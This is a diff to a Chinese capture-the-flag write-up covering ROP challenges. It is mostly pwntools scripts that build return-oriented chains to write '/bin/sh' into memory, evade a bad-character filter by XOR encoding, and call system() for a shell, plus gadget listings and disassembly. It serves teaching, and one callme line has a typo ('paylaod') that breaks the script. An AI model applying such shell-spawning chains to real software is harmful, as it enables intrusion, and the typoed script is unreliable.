@@ -375,26 +375,444 @@ Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
 0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
 ```
 构造输入，有点长，我还是用 pwntools 吧：
-```
+```python
 from pwn import *
-
-io = process("./callme")
 
 callme_one_plt = 0x00401850
 callme_two_plt = 0x00401870
 callme_three_plt = 0x00401810
 pppr_addr = 0x00401ab0
 
-payload = "A"*40 + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_one_plt) + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_two_plt) + p64(pppr_addr) + p64(0x1) + p64(0x2) + p64(0x3) + p64(callme_three_plt)
+payload = ""
+payload += "A"*40
+payload += p64(pppr_addr)
+payload += p64(0x1) + p64(0x2) + p64(0x3)
+paylaod += p64(callme_one_plt)
+payload += p64(pppr_addr)
+payload += p64(0x1) + p64(0x2) + p64(0x3)
+payload += p64(callme_two_plt)
+payload += p64(pppr_addr)
+payload += p64(0x1) + p64(0x2) + p64(0x3)
+payload += p64(callme_three_plt)
 
+io = process("./callme")
 io.sendline(payload)
 print io.recvall()
 ```
 
 ## write4
+利用 gadget，将 `/bin/sh` 写入到 .data 段中，然后执行，这种方法的好处是不用泄露地址：
+```
+$ ropgadget --binary write432 --only "mov|pop|ret"
+...
+0x08048670 : mov dword ptr [edi], ebp ; ret
+0x080486da : pop edi ; pop ebp ; ret
+```
+我们需要 `0x080486da` 和 `0x08048670` 处的 gadget。已知 system() 的 plt 地址为 `0x8048430`， .data 段地址为 `0x804a028`。构造如下：
+```python
+from pwn import *
+
+pop_edi_ebp = 0x080486da
+mov_edi_ebp = 0x08048670
+data_addr = 0x804a028
+system_plt = 0x8048430
+
+payload = ""
+payload += "A"*44
+payload += p32(pop_edi_ebp)
+payload += p32(data_addr)
+payload += "/bin"
+payload += p32(mov_edi_ebp)
+payload += p32(pop_edi_ebp)
+payload += p32(data_addr+4)
+payload += "/sh\x00"
+payload += p32(mov_edi_ebp)
+payload += p32(system_plt)
+payload += "BBBB"
+payload += p32(data_addr)
+
+io = process('./write432')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
+```
+$ python2 exp.py 
+[+] Starting local process './write432': pid 26039
+[*] Switching to interactive mode
+ $ cat flag.txt
+ROPE{a_placeholder_32byte_flag!}
+```
+
+下面是 64 位程序：
+```
+$ ropgadget --binary write4 --only "mov|pop|ret"
+...
+0x0000000000400820 : mov qword ptr [r14], r15 ; ret
+0x0000000000400890 : pop r14 ; pop r15 ; ret
+0x0000000000400893 : pop rdi ; ret
+```
+```python
+from pwn import *
+
+pop_r14_r15 = 0x0000000000400890
+mov_r14_r15 = 0x0000000000400820
+pop_rdi = 0x0000000000400893
+data_addr = 0x0000000000601050
+system_plt = 0x004005e0
+
+payload = ""
+payload += "A"*40
+payload += p64(pop_r14_r15)
+payload += p64(data_addr)
+payload += "/bin/sh\x00"
+payload += p64(mov_r14_r15)
+payload += p64(pop_rdi)
+payload += p64(data_addr)
+payload += p64(system_plt)
+
+io = process('./write4')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
 
 ## badchars
+和上一题差不多，但这一次对部分敏感字符进行了 xor，所以在传参之前要利用 gadget 进行解密。
+
+在函数 `pwnme()` 中调用了进行字符检查的函数 `checkBadchars()`：
+```
+gdb-peda$ xrefs
+...
+0x8048775 <pwnme+191>:  call   0x8048801 <checkBadchars>
+...
+gdb-peda$ disassemble checkBadchars
+Dump of assembler code for function checkBadchars:
+   0x08048801 <+0>:     push   ebp
+   0x08048802 <+1>:     mov    ebp,esp
+   0x08048804 <+3>:     sub    esp,0x10
+   0x08048807 <+6>:     mov    BYTE PTR [ebp-0x10],0x62
+   0x0804880b <+10>:    mov    BYTE PTR [ebp-0xf],0x69
+   0x0804880f <+14>:    mov    BYTE PTR [ebp-0xe],0x63
+   0x08048813 <+18>:    mov    BYTE PTR [ebp-0xd],0x2f
+   0x08048817 <+22>:    mov    BYTE PTR [ebp-0xc],0x20
+   0x0804881b <+26>:    mov    BYTE PTR [ebp-0xb],0x66
+   0x0804881f <+30>:    mov    BYTE PTR [ebp-0xa],0x6e
+   0x08048823 <+34>:    mov    BYTE PTR [ebp-0x9],0x73
+   0x08048827 <+38>:    mov    DWORD PTR [ebp-0x4],0x0
+   0x0804882e <+45>:    mov    DWORD PTR [ebp-0x8],0x0
+   0x08048835 <+52>:    mov    DWORD PTR [ebp-0x4],0x0
+   0x0804883c <+59>:    jmp    0x804887c <checkBadchars+123>
+   0x0804883e <+61>:    mov    DWORD PTR [ebp-0x8],0x0
+   0x08048845 <+68>:    jmp    0x8048872 <checkBadchars+113>
+   0x08048847 <+70>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x0804884a <+73>:    mov    eax,DWORD PTR [ebp-0x4]
+   0x0804884d <+76>:    add    eax,edx
+   0x0804884f <+78>:    movzx  edx,BYTE PTR [eax]
+   0x08048852 <+81>:    lea    ecx,[ebp-0x10]
+   0x08048855 <+84>:    mov    eax,DWORD PTR [ebp-0x8]
+   0x08048858 <+87>:    add    eax,ecx
+   0x0804885a <+89>:    movzx  eax,BYTE PTR [eax]
+   0x0804885d <+92>:    cmp    dl,al
+   0x0804885f <+94>:    jne    0x804886e <checkBadchars+109>
+   0x08048861 <+96>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048864 <+99>:    mov    eax,DWORD PTR [ebp-0x4]
+   0x08048867 <+102>:   add    eax,edx
+   0x08048869 <+104>:   mov    BYTE PTR [eax],0xeb
+   0x0804886c <+107>:   jmp    0x8048878 <checkBadchars+119>
+   0x0804886e <+109>:   add    DWORD PTR [ebp-0x8],0x1
+   0x08048872 <+113>:   cmp    DWORD PTR [ebp-0x8],0x7
+   0x08048876 <+117>:   jbe    0x8048847 <checkBadchars+70>
+   0x08048878 <+119>:   add    DWORD PTR [ebp-0x4],0x1
+   0x0804887c <+123>:   mov    eax,DWORD PTR [ebp-0x4]
+   0x0804887f <+126>:   cmp    eax,DWORD PTR [ebp+0xc]
+   0x08048882 <+129>:   jb     0x804883e <checkBadchars+61>
+   0x08048884 <+131>:   nop
+   0x08048885 <+132>:   leave  
+   0x08048886 <+133>:   ret    
+End of assembler dump.
+```
+badchars 就是上面的从地址 `0x08048807` 到 `0x08048823` 的字符，也可以用 rabin2 查看：
+```
+$ rabin2 -z badchars32
+...
+vaddr=0x0804894c paddr=0x0000094c ordinal=003 sz=36 len=35 section=.rodata type=ascii string=badchars are: b i c / <space> f n s
+```
+查找带 xor 的 gadget：
+```
+$ ropgadget --binary badchars32 --only "mov|pop|ret|xor"
+...
+0x08048893 : mov dword ptr [edi], esi ; ret
+0x08048896 : pop ebx ; pop ecx ; ret
+0x08048899 : pop esi ; pop edi ; ret
+0x08048890 : xor byte ptr [ebx], cl ; ret
+```
+```python
+from pwn import *
+
+xor_ebx_cl  = 0x08048890
+pop_ebx_ecx = 0x08048896
+pop_esi_edi = 0x08048899
+mov_edi_esi = 0x08048893
+
+system_plt  = 0x080484e0
+data_addr   = 0x0804a038
+
+# 加密
+badchars    = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
+xor_byte    = 0x1
+while(1):
+    binsh = ""
+    for i in "/bin/sh\x00":
+        c = ord(i) ^ xor_byte
+        if c in badchars:
+            xor_byte += 1
+            break
+        else:
+            binsh += chr(c)
+    if len(binsh) == 8:
+        break
+
+# 写入
+payload = ""
+payload += "A"*44
+payload += p32(pop_esi_edi)
+payload += binsh[:4]
+payload += p32(data_addr)
+payload += p32(mov_edi_esi)
+payload += p32(pop_esi_edi)
+payload += binsh[4:8]
+payload += p32(data_addr + 4)
+payload += p32(mov_edi_esi)
+
+# 解密
+for i in range(len(binsh)):
+    payload += p32(pop_ebx_ecx)
+    payload += p32(data_addr + i)
+    payload += p32(xor_byte)
+    payload += p32(xor_ebx_cl)
+
+# 执行
+payload += p32(system_plt)
+payload += "BBBB"
+payload += p32(data_addr)
+
+io = process('./badchars32')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
+
+下面是 64 位程序：
+```
+$ ropgadget --binary badchars --only "mov|pop|ret|xor"
+...
+0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
+0x0000000000400b3b : pop r12 ; pop r13 ; ret
+0x0000000000400b40 : pop r14 ; pop r15 ; ret
+0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
+0x0000000000400b39 : pop rdi ; ret
+```
+```python
+from pwn import *
+
+pop_r12_r13  = 0x0000000000400b3b
+mov_r13_r12  = 0x0000000000400b34
+pop_r14_r15  = 0x0000000000400b40
+xor_r15_r14b = 0x0000000000400b30
+pop_rdi      = 0x0000000000400b39
+
+system_plt = 0x00000000004006f0
+data_addr  = 0x0000000000601000
+
+badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
+xor_byte = 0x1
+while(1):
+    binsh = ""
+    for i in "/bin/sh\x00":
+        c = ord(i) ^ xor_byte
+        if c in badchars:
+            xor_byte += 1
+            break
+        else:
+            binsh += chr(c)
+    if len(binsh) == 8:
+        break
+
+payload = ""
+payload += "A"*40
+payload += p64(pop_r12_r13)
+payload += binsh
+payload += p64(data_addr)
+payload += p64(mov_r13_r12)
+
+for i in range(len(binsh)):
+    payload += p64(pop_r14_r15)
+    payload += p64(xor_byte)
+    payload += p64(data_addr + i)
+    payload += p64(xor_r15_r14b)
+
+payload += p64(pop_rdi)
+payload += p64(data_addr)
+payload += p64(system_plt)
+
+io = process('./badchars')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
 
 ## fluff
+看题目的意思是利用类似 `mov [reg], reg` 这样的 gadgets 将 `/bin/sh` 写入，然后执行，但是通过 ropgadget 的搜索，发现没有像以上题目那样直接的 gadgets，稍微增加了一点难度：
+```
+$ ropgadget --binary fluff32 --only "mov|pop|ret|xor|xchg"
+...
+0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
+0x080483e1 : pop ebx ; ret
+0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
+0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
+0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
+```
+`ecx` 放地址， `edx` 放数据，然后把数据写到地址处：
+```python
+from pwn import *
+
+system_plt   = 0x08048430
+data_addr = 0x0804a028
+
+pop_ebx      = 0x080483e1
+mov_ecx_edx  = 0x08048693
+xchg_edx_ecx = 0x08048689
+xor_edx_ebx  = 0x0804867b
+xor_edx_edx  = 0x08048671
+
+def write_data(data, addr):
+    # addr -> ecx
+    payload = ""
+    payload += p32(xor_edx_edx)
+    payload += "BBBB"
+    payload += p32(pop_ebx)
+    payload += p32(addr)
+    payload += p32(xor_edx_ebx)
+    payload += "BBBB"
+    payload += p32(xchg_edx_ecx)
+    payload += "BBBB"
+    
+    # data -> edx
+    payload += p32(xor_edx_edx)
+    payload += "BBBB"
+    payload += p32(pop_ebx)
+    payload += data
+    payload += p32(xor_edx_ebx)
+    payload += "BBBB"
+    
+    # edx -> [ecx]
+    payload += p32(mov_ecx_edx)
+    payload += "BBBB"
+    payload += p32(0)
+
+    return payload
+
+payload = ""
+payload += "A"*44
+
+payload += write_data("/bin", data_addr)
+payload += write_data("/sh\x00", data_addr + 4)
+
+payload += p32(system_plt)
+payload += "BBBB"
+payload += p32(data_addr)
+
+io = process('./fluff32')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
+
+下面是 64 位程序：
+```
+$ ropgadget --binary fluff --only "mov|pop|ret|xor|xchg" --depth 20
+...
+0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
+0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
+0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
+0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
+0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
+```
+```python
+from pwn import *
+
+system_plt = 0x004005e0
+data_addr  = 0x0000000000601050
+
+xor_r11_r11 = 0x0000000000400822
+xor_r11_r12 = 0x000000000040082f
+xchg_r11_r10 = 0x0000000000400840
+mov_r10_r11 = 0x000000000040084c
+pop_r12 = 0x0000000000400832
+
+def write_data(data, addr):
+    # addr -> r10
+    payload = ""
+    payload += p64(xor_r11_r11)
+    payload += "BBBBBBBB"
+    payload += p64(pop_r12)
+    payload += p64(addr)
+    payload += p64(xor_r11_r12)
+    payload += "BBBBBBBB"
+    payload += p64(xchg_r11_r10)
+    payload += "BBBBBBBB"
+    
+    # data -> r11
+    payload += p64(xor_r11_r11)
+    payload += "BBBBBBBB"
+    payload += p64(pop_r12)
+    payload += data
+    payload += p64(xor_r11_r12)
+    payload += "BBBBBBBB"
+    
+    # r11 -> [r10]
+    payload += p64(mov_r10_r11)
+    payload += "BBBBBBBB"*2
+    payload += p64(0)
+    
+    return payload
+
+payload = ""
+payload += "A"*40
+payload += write_data("/bin/sh\x00", data_addr)
+payload += p64(system_plt)
+
+io = process('./fluff')
+io.recvuntil('>')
+io.sendline(payload)
+io.interactive()
+```
 
 ## pivot
+这个程序有两次输入，第一次输入放在一个由 `malloc()` 函数分配的地址上，未了降低难度，特地把这个地址打印了出来，第二次的输入放在一个大小限制为 13 字节的栈上，所以我们把主要的逻辑由第一次输入，而第二次主要用于跳转到第一次的地址上。
+
+首先我们默认是开启 ASLR 的，这样共享库地址是动态的，我们需要利用 gadgets 泄露出函数 `foothold_function()` 的内存地址，通过相对位置计算得到我们的目标函数 `ret2win()` 的地址。
+```
+gdb-peda$ disassemble foothold_function
+Dump of assembler code for function foothold_function@plt:
+   0x080485f0 <+0>:     jmp    DWORD PTR ds:0x804a024
+   0x080485f6 <+6>:     push   0x30
+   0x080485fb <+11>:    jmp    0x8048580
+End of assembler dump.
+gdb-peda$ x/5x 0x804a024
+0x804a024:      0x080485f6      0x08048606      0x08048616      0x08048626
+0x804a034:      0x00000000
+```
+所以 `foothold_function()` 的 plt 地址为 `0x080485f0`，got.plt 地址为 `0x804a024`。
+
+```
+$ ropgadget --binary pivot32 --only "mov|pop|xchg|ret|add|call"
+...
+0x080488c4 : mov eax, dword ptr [eax] ; ret
+0x080488c0 : pop eax ; ret
+0x08048571 : pop ebx ; ret
+0x080488c2 : xchg eax, esp ; ret
+0x080488c7 : add eax, ebx ; ret
+0x080486a3 : call eax
+```
